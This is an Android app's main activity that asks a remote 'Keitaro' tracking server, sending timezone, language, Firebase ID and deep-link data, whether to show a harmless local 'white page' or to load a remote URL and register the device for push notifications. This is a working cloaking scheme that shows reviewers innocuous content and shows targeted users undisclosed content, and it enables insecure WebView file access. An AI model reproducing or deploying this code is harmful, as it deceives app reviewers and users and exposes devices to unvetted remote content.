package com.befunkla.dexclassloader;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Log;
import android.view.KeyEvent;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.firebase.iid.FirebaseInstanceId;
import com.onesignal.OneSignal;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.net.CookieHandler;
import java.net.CookieManager;
import java.net.CookiePolicy;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.TimeZone;

import bolts.AppLinks;

public class MainActivity extends AppCompatActivity {

    private WebView webView;
    private SharedPreferences sharedPreferences;
    private Handler statusUpdateHandler = new Handler();
    private Runnable statusUpdateRunnable;
    private ProgressDialog progressDialog;

    private final Number SHOW_WHITE_PAGE = 1;
    private final Number KEITARO_URL = 2;
    private final String WHITE_PAGE_URL = "file:///android_asset/index.html";

    private boolean backPressedOnce = false;

    private String mCM;
    private ValueCallback<Uri> mUM;
    private ValueCallback<Uri[]> mUMA;
    private final static int FCR = 1;

    public static void a(AppCompatActivity activity) {
        Intent intent = new Intent(activity, MainActivity.class);
        activity.startActivity(intent);
//        activity.finish();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        FacebookSdk.sdkInitialize(this);

        CookieManager cookieManager = new CookieManager(new PersistentCookieStore(getApplicationContext()), CookiePolicy.ACCEPT_ALL);
        CookieHandler.setDefault(cookieManager);

        webView = findViewById(R.id.webView);
        setWebView();

        progressDialog = new ProgressDialog(this);
        progressDialog.setMessage("Loading ...");
        progressDialog.setCancelable(false);
        progressDialog.show();

        sharedPreferences = getSharedPreferences(BuildConfig.APPLICATION_ID, Context.MODE_PRIVATE);
        boolean showWhitePage = sharedPreferences.getBoolean(SHOW_WHITE_PAGE.toString(), false);
        String keitaroUrl = sharedPreferences.getString(KEITARO_URL.toString(), null);
        if (showWhitePage) {
            Log.w("debug", "load showWhitePage");
            webView.loadUrl(WHITE_PAGE_URL);
        } else if (keitaroUrl != null) {
            Log.w("debug", "load keitaroUrl");
            loadKeitaroUrl(keitaroUrl);
        } else {
            obtainDeepLink();
        }
    }

    private void obtainDeepLink() {
        Uri targetUrl = AppLinks.getTargetUrlFromInboundIntent(getApplicationContext(), getIntent());
        if (targetUrl != null) {
            String keitaroUrl = generateAndSaveKeitaroUrl(targetUrl.toString());
            loadKeitaroUrl(keitaroUrl);
        } else {
            AppLinkData.fetchDeferredAppLinkData(this,
                    new AppLinkData.CompletionHandler() {
                        @Override
                        public void onDeferredAppLinkDataFetched(final AppLinkData appLinkData) {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    Log.w("debug", "appLinkData: " + appLinkData);
                                    String keitaroUrl;
//                                    keitaroUrl = generateAndSaveKeitaroUrl("fblink://v?utm_content=JhFN_ZHw&showIn=browser");
                                    if (appLinkData != null && appLinkData.getTargetUri() != null) {
                                        keitaroUrl = generateAndSaveKeitaroUrl(appLinkData.getTargetUri().toString());
                                    } else {
                                        if(getIntent().getDataString() != null){
                                            final Intent intent = getIntent();
                                            keitaroUrl = generateAndSaveKeitaroUrl(intent.getDataString());
                                            Log.w("debug", "appLinkData test: " + intent.getDataString());
                                        } else {
                                            Log.w("debug", "appLinkData = null");
                                            keitaroUrl = generateAndSaveKeitaroUrl(null);
                                        }
                                    }
                                    loadKeitaroUrl(keitaroUrl);
                                }
                            });
                        }
                    }
            );
        }

    }

    private String generateAndSaveKeitaroUrl(String deepLink) {
        String result = Uri.parse("https://app." + getString(R.string.domain) + "/api/entry")
                .buildUpon()
                .appendQueryParameter("package", BuildConfig.APPLICATION_ID)
                .appendQueryParameter("timezone", TimeZone.getDefault().getID())
                .appendQueryParameter("timezoneOffset", String.valueOf(TimeZone.getDefault().getOffset(new Date().getTime()) / 3600000))
                .appendQueryParameter("language", Locale.getDefault().getLanguage())
                .appendQueryParameter("version", BuildConfig.VERSION_NAME)
                .appendQueryParameter("firebaseInstanceId", FirebaseInstanceId.getInstance().getId())
                .appendQueryParameter("utm_content", (deepLink != null ? deepLink : ""))
                .build().toString();

        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString(KEITARO_URL.toString(), result);
        editor.apply();
        return result;
    }

    private void loadKeitaroUrl(String keitaroUrl) {
        Log.w("debug", "Requiring... " + keitaroUrl);
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest
                (Request.Method.GET, keitaroUrl, null, new Response.Listener<JSONObject>() {

                    @Override
                    public void onResponse(JSONObject response) {
                        Log.d("debug", "Successful response " + response);
                        parseData(response);
                    }
                }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Log.w("debug", "Request is failed");
                        webView.loadUrl(WHITE_PAGE_URL);
                    }
                });

        RequestQueue queue = Volley.newRequestQueue(this);
        queue.add(jsonObjectRequest);
    }

    private void parseData(JSONObject response) {
        try {
            String url = response.getString("url");
            String showIn = response.getString("showIn");
            if (url.equals(WHITE_PAGE_URL)) {
                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putBoolean(SHOW_WHITE_PAGE.toString(), true);
                editor.apply();
                Log.w("debug", "Saved url: " + url);
            } else {
                subscribeInOneSignal();
            }

            if(showIn.equals("browser") && !url.equals(WHITE_PAGE_URL)) {
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                startActivity(browserIntent);

                finish();
            } else {
                Log.w("debug", "Got url: " + url);
                webView.loadUrl(url);
            }
        } catch (JSONException e) {
            Log.w("debug", "parseDataError");
            e.printStackTrace();
            webView.loadUrl(WHITE_PAGE_URL);
        }
    }

    private void subscribeInOneSignal() {
        Log.w("debug", "subscribeInOneSignal");
        Thread myThread = new Thread(
                new Runnable() {
                    public void run() {
                        OneSignal.startInit(getApplicationContext())
                                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                                .unsubscribeWhenNotificationsAreDisabled(true)
                                .init();
                        OneSignal.setExternalUserId(FirebaseInstanceId.getInstance().getId());
                    }
                }
        );
        myThread.start();
    }

    private void setWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowUniversalAccessFromFileURLs(true);
        settings.setAllowFileAccessFromFileURLs(true);
        settings.setAppCacheEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);

        webView.setWebViewClient(new WebViewClient() {
            @TargetApi(Build.VERSION_CODES.N)
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                view.loadUrl(request.getUrl().toString());
                return true;
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            public void onProgressChanged(WebView view, int progress) {
                if (progress == 100 && progressDialog != null) {
                    progressDialog.dismiss();
                    progressDialog = null;
                }
            }
            public boolean onShowFileChooser(WebView webView,
                                             ValueCallback<Uri[]> filePathCallback,
                                             WebChromeClient.FileChooserParams fileChooserParams) {
                if (mUMA != null) {
                    mUMA.onReceiveValue(null);
                }
                mUMA = filePathCallback;
                Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                if (takePictureIntent.resolveActivity(MainActivity.this.getPackageManager()) != null) {
                    File photoFile = null;
                    try {
                        photoFile = createImageFile();
                        takePictureIntent.putExtra("PhotoPath", mCM);
                    } catch (IOException ex) {
                        Log.e("Webview", "Image file creation failed", ex);
                    }
                    if (photoFile != null) {
                        mCM = "file:" + photoFile.getAbsolutePath();
                        takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(photoFile));
                    } else {
                        takePictureIntent = null;
                    }
                }

                Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                contentSelectionIntent.setType("*/*");
                Intent[] intentArray;
                if (takePictureIntent != null) {
                    intentArray = new Intent[]{takePictureIntent};
                } else {
                    intentArray = new Intent[0];
                }

                Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
                chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser");
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
                startActivityForResult(chooserIntent, FCR);
                return true;
            }
        });

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {

        super.onActivityResult(requestCode, resultCode, intent);
        if (Build.VERSION.SDK_INT >= 21) {
            Uri[] results = null;
            //Check if response is positive
            if (resultCode == Activity.RESULT_OK) {
                if (requestCode == FCR) {
                    if (null == mUMA) {
                        return;
                    }
                    if (intent == null) {
                        //Capture Photo if no image available
                        if (mCM != null) {
                            results = new Uri[]{Uri.parse(mCM)};
                        }
                    } else {
                        String dataString = intent.getDataString();
                        if (dataString != null) {
                            results = new Uri[]{Uri.parse(dataString)};
                        }
                    }
                }
            }
            mUMA.onReceiveValue(results);
            mUMA = null;
        } else {
            if (requestCode == FCR) {
                if (null == mUM) return;
                Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
                mUM.onReceiveValue(result);
                mUM = null;
            }
        }
    }

    private File createImageFile() throws IOException {
        @SuppressLint("SimpleDateFormat") String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String imageFileName = "img_" + timeStamp + "_";
        File storageDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        return File.createTempFile(imageFileName, ".jpg", storageDir);
    }

    @Override
    public boolean onKeyDown(int keyCode, @NonNull KeyEvent event) {
        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            switch (keyCode) {
                case KeyEvent.KEYCODE_BACK:
                    if (webView.canGoBack()) {
                        webView.goBack();
                    } else {
                        finish();
                    }
                    return true;
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            if (backPressedOnce) {
                super.onBackPressed();
            }

            backPressedOnce = true;
            final Toast toast = Toast.makeText(this, "Press again to exit", Toast.LENGTH_SHORT);
            toast.show();

            statusUpdateRunnable = new Runnable() {
                @Override
                public void run() {
                    backPressedOnce = false;
                    toast.cancel();
                }
            };
            statusUpdateHandler.postDelayed(statusUpdateRunnable, 2000);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (statusUpdateHandler != null) {
            statusUpdateHandler.removeCallbacks(statusUpdateRunnable);
        }
        if (progressDialog != null) {
            progressDialog.dismiss();
        }
    }
}
